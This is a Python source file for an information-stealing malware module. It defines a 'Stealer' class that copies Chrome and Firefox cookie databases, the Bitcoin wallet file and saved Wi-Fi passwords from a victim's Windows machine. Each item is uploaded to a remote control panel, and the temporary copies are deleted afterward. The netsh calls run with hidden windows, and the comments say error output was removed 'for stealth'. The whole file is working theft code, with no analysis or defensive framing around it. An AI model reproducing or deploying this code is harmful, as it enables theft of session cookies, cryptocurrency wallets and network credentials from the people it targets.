import tempfile, subprocess, re, os, getpass, shutil, glob # Added glob for Firefox profile discovery
from HTTPSocket import HTTPSocket

class Stealer:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(str(panelURL), str(machineID))   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir() 
        self.username = getpass.getuser()

    def steal_chrome_cookie(self):
        #Chrome DB Path: C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies
        try:
            source = os.path.join("C:\\Users", self.username, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
            destination = os.path.join(self.tempdir, "CookiesCh.sqlite")
            
            shutil.copyfile(source, destination)    
            
            self.C.Upload(destination)
            os.remove(destination)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Stealed Chrome Cookies Successfully")
        except Exception as e:
            # print("[Error In Stealer, steal_chrome_cookie() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        

    def steal_firefox_cookie(self):
        #Firefox DB Path: C:\Users\USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles\<random_string>.default\cookies.sqlite            
        try:
            firefox_profiles_base_path = os.path.join(os.environ["AppData"], "Mozilla", "Firefox", "Profiles")
            source = None

            # Dynamically find the Firefox profile directory
            # Look for any directory that ends with .default or .default-release and contains cookies.sqlite
            for profile_dir in glob.iglob(os.path.join(firefox_profiles_base_path, '*')):
                cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
                if os.path.exists(cookies_path):
                    source = cookies_path
                    break # Found a valid cookies file

            if source:
                destination = os.path.join(self.tempdir, "cookies.sqlite")
                shutil.copyfile(source, destination)
                self.C.Upload(destination)
                os.remove(destination)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Firefox Cookies Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Firefox cookies.sqlite not found in any profile.")

        except Exception as e:
            self.C.Send("CleanCommands")
            # print("[Error In Stealer, steal_firefox_cookie() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            if "No such file or directory" in str(e):
                self.C.Log("Fail", "Firefox Browser or its cookies.sqlite not found.") 
            else:
                self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 

    def steal_bitcoin_wallet(self):
        try:
            wallet_path = os.path.join("C:\\Users", self.username, "AppData", "Bitcoin", "wallet.dat")
            if os.path.exists(wallet_path):
                self.C.Upload(wallet_path)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Bitcoin Wallet Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Bitcoin Wallet Not Found In Victim PC")                
        except Exception as e:
            # print("[Error In Stealer, steal_bitcoin_wallet() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        

    def steal_wifi_password(self):
        """
        When Called, 
        1. Steals Wifi Password
        2. Saves Result In WifiPassword.txt Inside TEMP directory
        3. Uploads WifiPassword.txt
        4. Atlast Deletes WifiPassword.txt from TEMP directory
        """    
        try:
            wifi_password_file = os.path.join(self.tempdir, "WifiPassword.txt")
            command = "netsh wlan show profile"
            result = ""

            networks = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            networks = networks.decode(encoding="utf-8", errors="strict")
            network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks) 

            for network_name in network_names_list:
                try:
                    command = "netsh wlan show profile \"" + network_name + "\" key=clear"
                    current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
                    current_result = current_result.decode(encoding="utf-8", errors="strict")        
                    
                    ssid = re.findall("(?:SSID name\\s*:\\s)(.*)", str(current_result))
                    authentication = re.findall(r"(?:Authentication\\s*:\\s)(.*)", current_result)
                    cipher = re.findall("(?:Cipher\\s*:\\s)(.*)", current_result)
                    security_key = re.findall(r"(?:Security key\\s*:\\s)(.*)", current_result)
                    password = re.findall("(?:Key Content\\s*:\\s)(.*)", current_result)
                    
                    result += "\n\nSSID           : " + (ssid[0].strip() if ssid else "N/A") + "\n"
                    result += "Authentication : " + (authentication[0].strip() if authentication else "N/A") + "\n"
                    result += "Cipher         : " + (cipher[0].strip() if cipher else "N/A") + "\n"
                    result += "Security Key   : " + (security_key[0].strip() if security_key else "N/A") + "\n"
                    result += "Password       : " + (password[0].strip() if password else "N/A") 
                except Exception: 
                    pass 
        
            with open(wifi_password_file, "w") as f:
                f.write(result)
                
            self.C.Upload(wifi_password_file)   
            os.remove(wifi_password_file)
            self.C.Log("Succ", "Wifi Password Retrived Successfully")
            self.C.Send("CleanCommands")         
        except Exception as e:
            # print("[Error In Stealer, steal_wifi_password() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            self.C.Send("CleanCommands")           
                    
